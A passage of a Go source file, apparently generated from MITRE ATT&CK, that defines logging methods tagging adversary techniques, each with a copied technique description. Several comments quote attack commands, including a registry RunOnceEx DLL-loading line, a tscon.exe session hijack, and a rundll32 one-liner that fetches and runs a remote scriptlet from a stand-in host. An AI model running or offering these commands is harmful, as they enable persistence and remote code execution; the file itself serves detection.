        Msg("query registry")
}

/* ATTACKEntRCScripts Phases: persistence privilege-escalation

Adversaries may establish persistence by modifying RC scripts which are executed
during a Unix-like system’s startup. These files allow system administrators to
map and start custom services at startup for different run levels. RC scripts
require root privileges to modify. Adversaries can establish persistence by
adding a malicious binary path or shell commands to rc.local, rc.common, and
other RC scripts specific to the Unix-like distribution.(Citation: IranThreats
Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system
executes the script's contents as root, resulting in persistence. Adversary
abuse of RC scripts is especially effective for lightweight Unix-like
distributions using the root user as default, such as IoT or embedded
systems.(Citation: intezer-kaiji-malware) Several Unix-like systems have moved
to Systemd and deprecated the use of RC scripts. This is now a deprecated
mechanism in macOS in favor of Launchd. (Citation: Apple Developer Doco Archive
Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther
v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods
of Mac Malware Persistence) To maintain backwards compatibility some systems,
such as Ubuntu, will execute the RC scripts if they exist with the correct file
permissions.(Citation: Ubuntu Manpage systemd rc)
*/
func (g *Session) ATTACKEntRCScripts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1037.004").
        Msg("rc scripts")
}

/* ATTACKEntRDPHijacking Phases: lateral-movement

Adversaries may hijack a legitimate user’s remote desktop session to move
laterally within an environment. Remote desktop is a common feature in operating
systems. It allows a user to log into an interactive session with a system
desktop graphical user interface on a remote system. Microsoft refers to its
implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services
(RDS).(Citation: TechNet Remote Desktop Services) Adversaries may perform RDP
session hijacking which involves stealing a legitimate user's remote session.
Typically, a user is notified when someone else is trying to steal their
session. With System permissions and using Terminal Services Console,
c:\windows\system32\tscon.exe [session number to be stolen], an adversary can
hijack a session without the need for credentials or prompts to the
user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally
and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can
also lead to Remote System Discovery and Privilege Escalation by stealing a
Domain Admin or higher privileged account session. All of this can be done by
using native Windows commands, but it has also been added as a feature in red
teaming tools.(Citation: Kali Redsnarf)
*/
func (g *Session) ATTACKEntRDPHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1563.002").
        Msg("rdp hijacking")
}

/* ATTACKEntROMMONkit Phases: defense-evasion persistence

Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized
firmware with adversary code to provide persistent access and manipulate device
behavior that is difficult to detect. (Citation: Cisco Synful Knock
Evolution)(Citation: Cisco Blog Legacy Device Attacks) ROMMON is a Cisco network
device firmware that functions as a boot loader, boot image, or boot helper to
initialize hardware and software when the platform is powered on or reset.
Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or
remotely (for example, through TFTP) with adversary code and restart the device
in order to overwrite the existing ROMMON image. This provides adversaries with
the means to update the ROMMON to gain persistence on a system in a way that may
be difficult to detect.
*/
func (g *Session) ATTACKEntROMMONkit(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1542.004").
        Msg("rommonkit")
}

/* ATTACKEntReopenedApplications Phases: persistence privilege-escalation

Adversaries may modify plist files to automatically run an application when a
user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain
applications to be re-opened when a user logs into their machine after reboot.
While this is usually done via a Graphical User Interface (GUI) on an app-by-app
basis, there are property list files (plist) that contain this information as
well located at ~/Library/Preferences/com.apple.loginwindow.plist and
~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist.  An adversary can
modify one of these files directly to include a link to their malicious
executable to provide a persistence mechanism each time the user reboots their
machine (Citation: Methods of Mac Malware Persistence).
*/
func (g *Session) ATTACKEntReopenedApplications(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.007").
        Msg("re-opened applications")
}

/* ATTACKEntReduceKeySpace Phases: defense-evasion

Adversaries may reduce the level of effort required to decrypt data transmitted
over the network by reducing the cipher strength of encrypted
communications.(Citation: Cisco Synful Knock Evolution) Adversaries can weaken
the encryption software on a compromised network device by reducing the key size
used by the software to convert plaintext to ciphertext (e.g., from hundreds or
thousands of bytes to just a couple of bytes). As a result, adversaries
dramatically reduce the amount of effort needed to decrypt the protected
information without the key. Adversaries may modify the key size used and other
encryption parameters using specialized commands in a Network Device CLI
introduced to the system through Modify System Image to change the configuration
of the device. (Citation: Cisco Blog Legacy Device Attacks)
*/
func (g *Session) ATTACKEntReduceKeySpace(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1600.001").
        Msg("reduce key space")
}

/* ATTACKEntRedundantAccess Phases: defense-evasion persistence

This technique has been deprecated. Please use Create Account, Web Shell, and
External Remote Services where appropriate. Adversaries may use more than one
remote access tool with varying command and control protocols or credentialed
access to remote services so they can maintain access if an access mechanism is
detected or mitigated.  If one type of tool is detected and blocked or removed
as a response but the organization did not gain a full understanding of the
adversary's tools and access, then the adversary will be able to retain access
to the network. Adversaries may also attempt to gain access to Valid Accounts to
use External Remote Services such as external VPNs as a way to maintain access
despite interruptions to remote access tools deployed within a target
network.(Citation: Mandiant APT1) Adversaries may also retain access through
cloud-based infrastructure and applications. Use of a Web Shell is one such way
to maintain access to a network through an externally accessible Web server.
*/
func (g *Session) ATTACKEntRedundantAccess(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1108").
        Msg("redundant access")
}

/* ATTACKEntReflectionAmplification Phases: impact

Adversaries may attempt to cause a denial of service by reflecting a high-volume
of network traffic to a target. This type of Network DoS takes advantage of a
third-party server intermediary that hosts and will respond to a given spoofed
source IP address. This third-party server is commonly termed a reflector. An
adversary accomplishes a reflection attack by sending packets to reflectors with
the spoofed address of the victim. Similar to Direct Network Floods, more than
one system may be used to conduct the attack, or a botnet may be used. Likewise,
one or more reflector may be used to focus traffic on the target.(Citation:
Cloudflare ReflectionDoS May 2017) Reflection attacks often take advantage of
protocols with larger responses than requests in order to amplify their traffic,
commonly known as a Reflection Amplification attack. Adversaries may be able to
generate an increase in volume of attack traffic that is several orders of
magnitude greater than the requests sent to the amplifiers. The extent of this
increase will depending upon many variables, such as the protocol in question,
the technique used, and the amplifying servers that actually produce the
amplification in attack volume. Two prominent protocols that have enabled
Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS)
and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several
others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan
2018)  In particular, the memcache protocol showed itself to be a powerful
protocol, with amplification sizes up to 51,200 times the requesting
packet.(Citation: Cloudflare Memcrashed Feb 2018)
*/
func (g *Session) ATTACKEntReflectionAmplification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1498.002").
        Msg("reflection amplification")
}

/* ATTACKEntRegistryRunKeysStartupFolder Phases: persistence privilege-escalation

Adversaries may achieve persistence by adding a program to a startup folder or
referencing it with a Registry run key. Adding an entry to the "run keys" in the
Registry or startup folder will cause the program referenced to be executed when
a user logs in. (Citation: Microsoft Run Key) These programs will be executed
under the context of the user and will have the account's associated permissions
level. Placing a program within a startup folder will also cause that program to
execute when a user logs in. There is a startup folder location for individual
user accounts as well as a system-wide startup folder that will be checked
regardless of which user account logs in. The startup folder path for the
current user is C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup. The startup folder path for all users is
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp. The following run
keys are created by default on Windows systems:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce  Run keys
may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
Malwarebytes Wow6432Node 2016) The
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx is also
available but is not created by default on Windows Vista and newer. Registry run
key entries can reference programs directly or list them as a dependency.
(Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a
DLL at logon using a "Depend" key with RunOnceEx: reg add
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d
"C:\temp\evil[.]dll" (Citation: Oddvar Moe RunOnceEx Mar 2018) The following
Registry keys can be used to set startup folder items for persistence:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell
Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell
Folders  The following Registry keys can control automatic startup of services
during boot:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices  Using
policy settings to specify startup programs creates corresponding values in
either of two Registry keys:  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Curr
entVersion\Policies\Explorer\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\Cu
rrentVersion\Policies\Explorer\Run  The Winlogon key controls actions that occur
when a user logs on to a computer running Windows 7. Most of these actions are
under the control of the operating system, but you can also add custom actions
here. The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon\Userinit and
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
subkeys can automatically launch programs. Programs listed in the load value of
the registry key HKEY_CURRENT_USER\Software\Microsoft\Windows
NT\CurrentVersion\Windows run when any user logs on. By default, the multistring
BootExecute value of the registry key
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager is set to
autocheck autochk *. This value causes Windows, at startup, to check the file-
system integrity of the hard disks if the system has been shut down abnormally.
Adversaries can add other programs or processes to this registry value which
will automatically launch at boot. Adversaries can use these configuration
locations to execute malware, such as remote access tools, to maintain
persistence through system reboots. Adversaries may also use Masquerading to
make the Registry entries look as if they are associated with legitimate
programs.
*/
func (g *Session) ATTACKEntRegistryRunKeysStartupFolder(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.001").
        Msg("registry run keys / startup folder")
}

/* ATTACKEntRegsvcsRegasm Phases: defense-evasion

Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a
trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities
that are used to register .NET Component Object Model (COM) assemblies. Both are
digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)
Both utilities may be used to bypass application control through use of
attributes within the binary to specify code that should be run before
registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction]
respectively. The code with the registration and unregistration attributes will
be executed even if the process is run under insufficient privileges and fails
to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)
*/
func (g *Session) ATTACKEntRegsvcsRegasm(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.009").
        Msg("regsvcs/regasm")
}

/* ATTACKEntRegsvr32 Phases: defense-evasion

Adversaries may abuse Regsvr32.exe to proxy execution of malicious code.
Regsvr32.exe is a command-line program used to register and unregister object
linking and embedding controls, including dynamic link libraries (DLLs), on
Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation:
Microsoft Regsvr32) Malicious usage of Regsvr32.exe may avoid triggering
security tools that may not monitor execution of, and modules loaded by, the
regsvr32.exe process because of allowlists or false positives from Windows using
regsvr32.exe for normal operations. Regsvr32.exe can also be used to
specifically bypass application control using functionality to load COM
scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network
and proxy aware, the scripts can be loaded by passing a uniform resource locator
(URL) to file on an external Web server as an argument during invocation. This
method makes no changes to the Registry as the COM object is not actually
registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the
technique is often referred to as a "Squiblydoo" attack and has been used in
campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016)
(Citation: FireEye Regsvr32 Targeting Mongolian Gov) Regsvr32.exe can also be
leveraged to register a COM Object used to establish persistence via Component
Object Model Hijacking. (Citation: Carbon Black Squiblydoo Apr 2016)
*/
func (g *Session) ATTACKEntRegsvr32(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.010").
        Msg("regsvr32")
}

/* ATTACKEntRemoteAccessSoftware Phases: command-and-control

An adversary may use legitimate desktop support and remote access software, such
as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive
command and control channel to target systems within networks. These services
are commonly used as legitimate technical support software, and may be allowed
by application control within a target environment. Remote access tools like
VNC, Ammyy, and Teamviewer are used frequently when compared with other
legitimate software commonly used by adversaries. (Citation: Symantec Living off
the Land) Remote access tools may be established and used post-compromise as
alternate communications channel for redundant access or as a way to establish
an interactive remote desktop session with the target system. They may also be
used as a component of malware to establish a reverse connection or back-connect
to a service or adversary controlled system. Admin tools such as TeamViewer have
been used by several groups targeting institutions in countries of interest to
the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global
Threat Report) (Citation: CrySyS Blog TeamSpy)
*/
func (g *Session) ATTACKEntRemoteAccessSoftware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1219").
        Msg("remote access software")
}

/* ATTACKEntRemoteDataStaging Phases: collection

Adversaries may stage data collected from multiple systems in a central location
or directory on one system prior to Exfiltration. Data may be kept in separate
files or combined into one file through techniques such as Archive Collected
Data. Interactive command shells may be used, and common functionality within
cmd and bash may be used to copy data into a staging location. In cloud
environments, adversaries may stage data within a particular instance or virtual
machine before exfiltration. An adversary may Create Cloud Instance and stage
data in that instance.(Citation: Mandiant M-Trends 2020) By staging data on one
system prior to Exfiltration, adversaries can minimize the number of connections
made to their C2 server and better evade detection.
*/
func (g *Session) ATTACKEntRemoteDataStaging(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1074.002").
        Msg("remote data staging")
}

/* ATTACKEntRemoteDesktopProtocol Phases: lateral-movement

Adversaries may use Valid Accounts to log into a computer using the Remote
Desktop Protocol (RDP). The adversary may then perform actions as the logged-on
user. Remote desktop is a common feature in operating systems. It allows a user
to log into an interactive session with a system desktop graphical user
interface on a remote system. Microsoft refers to its implementation of the
Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation:
TechNet Remote Desktop Services)  Adversaries may connect to a remote system
over RDP/RDS to expand access if the service is enabled and allows access to
accounts with known credentials. Adversaries will likely use Credential Access
techniques to acquire credentials to use with RDP. Adversaries may also use RDP
in conjunction with the Accessibility Features technique for
Persistence.(Citation: Alperovitch Malware)
*/
func (g *Session) ATTACKEntRemoteDesktopProtocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1021.001").
        Msg("remote desktop protocol")
}

/* ATTACKEntRemoteEmailCollection Phases: collection

Adversaries may target an Exchange server, Office 365, or Google Workspace to
collect sensitive information. Adversaries may leverage a user's credentials and
interact directly with the Exchange server to acquire information from within a
network. Adversaries may also access externally facing Exchange services, Office
365, or Google Workspace to access email using credentials or access tokens.
Tools such as MailSniper can be used to automate searches for specific keywords.
*/
func (g *Session) ATTACKEntRemoteEmailCollection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1114.002").
        Msg("remote email collection")
}

/* ATTACKEntRemoteServiceSessionHijacking Phases: lateral-movement

Adversaries may take control of preexisting sessions with remote services to
move laterally in an environment. Users may use valid credentials to log into a
service specifically designed to accept remote connections, such as telnet, SSH,
and RDP. When a user logs into a service, a session will be established that
will allow them to maintain a continuous interaction with that service.
Adversaries may commandeer these sessions to carry out actions on remote
systems. Remote Service Session Hijacking differs from use of Remote Services
because it hijacks an existing session rather than creating a new session using
Valid Accounts.(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH
Hijack)
*/
func (g *Session) ATTACKEntRemoteServiceSessionHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1563").
        Msg("remote service session hijacking")
}

/* ATTACKEntRemoteServices Phases: lateral-movement

Adversaries may use Valid Accounts to log into a service specifically designed
to accept remote connections, such as telnet, SSH, and VNC. The adversary may
then perform actions as the logged-on user. In an enterprise environment,
servers and workstations can be organized into domains. Domains provide
centralized identity management, allowing users to login using one set of
credentials across the entire network. If an adversary is able to obtain a set
of valid domain credentials, they could login to many different machines using
remote access protocols such as secure shell (SSH) or remote desktop protocol
(RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)
*/
func (g *Session) ATTACKEntRemoteServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1021").
        Msg("remote services")
}

/* ATTACKEntRemoteSystemDiscovery Phases: discovery

Adversaries may attempt to get a listing of other systems by IP address,
hostname, or other logical identifier on a network that may be used for Lateral
Movement from the current system. Functionality could exist within remote access
tools to enable this, but utilities available on the operating system could also
be used such as  Ping or net view using Net. Adversaries may also use local host
files (ex: C:\Windows\System32\Drivers\etc\hosts or /etc/hosts) in order to
discover the hostname to IP address mappings of remote systems.  Specific to
macOS, the bonjour protocol exists to discover additional Mac-based systems
within the same broadcast domain.
*/
func (g *Session) ATTACKEntRemoteSystemDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1018").
        Msg("remote system discovery")
}

/* ATTACKEntRenameSystemUtilities Phases: defense-evasion

Adversaries may rename legitimate system utilities to try to evade security
mechanisms concerning the usage of those utilities. Security monitoring and
control mechanisms may be in place for system utilities adversaries are capable
of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those
security mechanisms by renaming the utility prior to utilization (ex: rename
rundll32.exe). (Citation: Elastic Masquerade Ball) An alternative case occurs
when a legitimate utility is copied or moved to a different directory and
renamed to avoid detections based on system utilities executing from non-
standard paths. (Citation: F-Secure CozyDuke)
*/
func (g *Session) ATTACKEntRenameSystemUtilities(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1036.003").
        Msg("rename system utilities")
}

/* ATTACKEntReplicationThroughRemovableMedia Phases: lateral-movement initial-access

Adversaries may move onto systems, possibly those on disconnected or air-gapped
networks, by copying malware to removable media and taking advantage of Autorun
features when the media is inserted into a system and executes. In the case of
Lateral Movement, this may occur through modification of executable files stored
on removable media or by copying malware and renaming it to look like a
legitimate file to trick users into executing it on a separate system. In the
case of Initial Access, this may occur through manual manipulation of the media,
modification of systems used to initially format the media, or modification to
the media's firmware itself.
*/
func (g *Session) ATTACKEntReplicationThroughRemovableMedia(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1091").
        Msg("replication through removable media")
}

/* ATTACKEntResourceHijacking Phases: impact

Adversaries may leverage the resources of co-opted systems in order to solve
resource intensive problems which may impact system and/or hosted service
availability.  One common purpose for Resource Hijacking is to validate
transactions of cryptocurrency networks and earn virtual currency. Adversaries
may consume enough system resources to negatively impact and/or cause affected
machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog
2017) Servers and cloud-based(Citation: CloudSploit - Unused AWS Regions)
systems are common targets because of the high potential for available
resources, but user endpoint systems may also be compromised and used for
Resource Hijacking and cryptocurrency mining. Containerized environments may
also be targeted due to the ease of deployment via exposed APIs and the
potential for scaling mining activities by deploying or compromising multiple
containers within an environment or cluster.(Citation: Unit 42 Hildegard
Malware)(Citation: Trend Micro Exposed Docker APIs) Additionally, some
cryptocurrency mining malware kills off processes for competing malware to
ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto
Miners)
*/
func (g *Session) ATTACKEntResourceHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1496").
        Msg("resource hijacking")
}

/* ATTACKEntRevertCloudInstance Phases: defense-evasion

An adversary may revert changes made to a cloud instance after they have
performed malicious activities in attempt to evade detection and remove evidence
of their presence. In highly virtualized environments, such as cloud-based
infrastructure, this may be accomplished by restoring virtual machine (VM) or
data storage snapshots through the cloud management dashboard or cloud APIs.
Another variation of this technique is to utilize temporary storage attached to
the compute instance. Most cloud providers provide various types of storage
including persistent, local, and/or ephemeral, with the ephemeral types often
reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS
Snapshots)(Citation: Google - Restore Cloud Snapshot)
*/
func (g *Session) ATTACKEntRevertCloudInstance(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1578.004").
        Msg("revert cloud instance")
}

/* ATTACKEntRighttoLeftOverride Phases: defense-evasion

Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E)
as a means of tricking a user into executing what they think is a benign file
type but is actually executable code. RTLO is a non-printing character that
causes the text that follows it to be displayed in reverse.(Citation:
Infosecinstitute RTLO Technique) For example, a Windows screensaver executable
named March 25 \u202Excod.scr will display as March 25 rcs.docx. A JavaScript
file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png. A
common use of this technique is with Spearphishing Attachment/Malicious File
since it can trick both end users and defenders if they are not aware of how
their tools display and render the RTLO character. Use of the RTLO character has
been seen in many targeted intrusion attempts and criminal activity.(Citation:
Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used
in the Windows Registry as well, where regedit.exe displays the reversed
characters but the command line tool reg.exe does not by default.
*/
func (g *Session) ATTACKEntRighttoLeftOverride(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1036.002").
        Msg("right-to-left override")
}

/* ATTACKEntRogueDomainController Phases: defense-evasion

Adversaries may register a rogue Domain Controller to enable manipulation of
Active Directory data. DCShadow may be used to create a rogue Domain Controller
(DC). DCShadow is a method of manipulating Active Directory (AD) data, including
objects and schemas, by registering (or reusing an inactive registration) and
simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a
rogue DC may be able to inject and replicate changes into AD infrastructure for
any domain object, including credentials and keys. Registering a rogue DC
involves creating a new server and nTDSDSA objects in the Configuration
partition of the AD schema, which requires Administrator privileges (either
Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz
Guide) This technique may bypass system logging and security monitors such as
security information and event management (SIEM) products (since actions taken
on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog)
The technique may also be used to alter and delete replication and other
associated metadata to obstruct forensic analysis. Adversaries may also utilize
this technique to perform SID-History Injection and/or manipulate AD objects
(such as accounts, access control lists, schemas) to establish backdoors for
Persistence. (Citation: DCShadow Blog)
*/
func (g *Session) ATTACKEntRogueDomainController(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1207").
        Msg("rogue domain controller")
}

/* ATTACKEntRootkit Phases: defense-evasion

Adversaries may use rootkits to hide the presence of programs, files, network
connections, services, drivers, and other system components. Rootkits are
programs that hide the existence of malware by intercepting/hooking and
modifying operating system API calls that supply system information. (Citation:
Symantec Windows Rootkits)  Rootkits or rootkit enabling functionality may
reside at the user or kernel level in the operating system or lower, to include
a hypervisor, Master Boot Record, or System Firmware. (Citation: Wikipedia
Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems.
(Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)
*/
func (g *Session) ATTACKEntRootkit(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1014").
        Msg("rootkit")
}

/* ATTACKEntRunVirtualInstance Phases: defense-evasion

Adversaries may carry out malicious operations using a virtual instance to avoid
detection. A wide variety of virtualization technologies exist that allow for
the emulation of a computer or computing environment. By running malicious code
inside of a virtual instance, adversaries can hide artifacts associated with
their behavior from security tools that are unable to monitor activity inside
the virtual instance. Additionally, depending on the virtual networking
implementation (ex: bridged adapter), network traffic generated by the virtual
instance can be difficult to trace back to the compromised host as the IP
address and hostname might not match known values.(Citation: SingHealth Breach
Jan 2019) Adversaries may utilize native support for virtualization (ex:
Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox
binaries). After running a virtual instance, adversaries may create a shared
folder between the guest and host with permissions that enable the virtual
instance to interact with the host file system.(Citation: Sophos Ragnar May
2020)
*/
func (g *Session) ATTACKEntRunVirtualInstance(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564.006").
        Msg("run virtual instance")
}

/* ATTACKEntRundll32 Phases: defense-evasion

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using
rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid
triggering security tools that may not monitor execution of the rundll32.exe
process because of allowlists or false positives from normal operations.
Rundll32.exe is commonly associated with executing DLL payloads. Rundll32.exe
can also be used to execute Control Panel Item files (.cpl) through the
undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser.
Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation:
Trend Micro CPL) Rundll32 can also be used to execute scripts such as
JavaScript. This can be done using a syntax similar to this: rundll32.exe
javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:ht
tps[:]//www[.]example[.]com/malicious.sct")"  This behavior has been seen used
by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
*/
func (g *Session) ATTACKEntRundll32(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.011").
        Msg("rundll32")
}

/* ATTACKEntRuntimeDataManipulation Phases: impact

Adversaries may modify systems in order to manipulate the data as it is accessed
and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ
Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to
affect a business process, organizational understanding, and decision making.
Adversaries may alter application binaries used to display data in order to
cause runtime manipulations. Adversaries may also conduct Change Default File
Association and Masquerading to cause a similar effect. The type of modification
and the impact it will have depends on the target application and process as
well as the goals and objectives of the adversary. For complex systems, an
adversary would likely need special expertise and possibly access to specialized
software related to the system that would typically be gained through a
prolonged information gathering campaign in order to have the desired impact.
*/
func (g *Session) ATTACKEntRuntimeDataManipulation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1565.003").
        Msg("runtime data manipulation")
}

/* ATTACKEntSAMLTokens Phases: credential-access

An adversary may forge SAML tokens with any permissions claims and lifetimes if
they possess a valid SAML token-signing certificate.(Citation: Microsoft
SolarWinds Steps) The default lifetime of a SAML token is one hour, but the
validity period can be specified in the NotOnOrAfter value of the conditions ...
element in a token. This value can be changed using the AccessTokenLifetime in a
LifetimeTokenPolicy.(Citation: Microsoft SAML Token Lifetimes) Forged SAML
tokens enable adversaries to authenticate across services that use SAML 2.0 as
an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML) An adversary
may utilize Private Keys to compromise an organization's token-signing
certificate to create forged SAML tokens. If the adversary has sufficient
permissions to establish a new federation trust with their own Active Directory
Federation Services (AD FS) server, they may instead generate their own trusted
token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance)
This differs from Steal Application Access Token and other similar behaviors in
that the tokens are new and forged by the adversary, rather than stolen or
intercepted from legitimate users. An adversary may gain administrative Azure AD
privileges if a SAML token is forged which claims to represent a highly
privileged account. This may lead to Use Alternate Authentication Material,
which may bypass multi-factor and other authentication protection
mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)
*/
func (g *Session) ATTACKEntSAMLTokens(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1606.002").
        Msg("saml tokens")
}

/* ATTACKEntSIDHistoryInjection Phases: defense-evasion privilege-escalation

Adversaries may use SID-History Injection to escalate privileges and bypass
access controls. The Windows security identifier (SID) is a unique value that
identifies a user or group account. SIDs are used by Windows security in both
security descriptors and access tokens. (Citation: Microsoft SID) An account can
hold additional SIDs in the SID-History Active Directory attribute (Citation:
Microsoft SID-History Attribute), allowing inter-operable account migration
between domains (e.g., all values in SID-History are included in access tokens).
With Domain Administrator (or equivalent) rights, harvested or well-known SID
values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-
History to enable impersonation of arbitrary users/groups such as Enterprise
Administrators. This manipulation may result in elevated access to local
resources and/or access to otherwise inaccessible domains via lateral movement
techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote
Management.
*/
func (g *Session) ATTACKEntSIDHistoryInjection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1134.005").
        Msg("sid-history injection")
}

/* ATTACKEntSIPandTrustProviderHijacking Phases: defense-evasion

Adversaries may tamper with SIP and trust provider components to mislead the
operating system and application control tools when conducting signature
validation checks. In user mode, Windows Authenticode (Citation: Microsoft
Authenticode) digital signatures are used to verify a file's origin and
integrity, variables that may be used to establish trust in signed code (ex: a
driver with a valid Microsoft signature may be handled as safe). The signature
validation process is handled via the WinVerifyTrust application programming
interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an
inquiry and coordinates with the appropriate trust provider, which is
responsible for validating parameters of a signature. (Citation: SpectorOps
Subverting Trust Sept 2017) Because of the varying executable file types and
corresponding signature formats, Microsoft created software components called
Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to
provide a layer of abstraction between API functions and files. SIPs are
responsible for enabling API functions to create, retrieve, calculate, and
verify signatures. Unique SIPs exist for most file formats (Executable,
PowerShell, Installer, etc., with catalog signing providing a catch-all
(Citation: Microsoft Catalog Files and Signatures April 2017)) and are
identified by globally unique identifiers (GUIDs). (Citation: SpectorOps
Subverting Trust Sept 2017) Similar to Code Signing, adversaries may abuse this
architecture to subvert trust controls and bypass security policies that allow
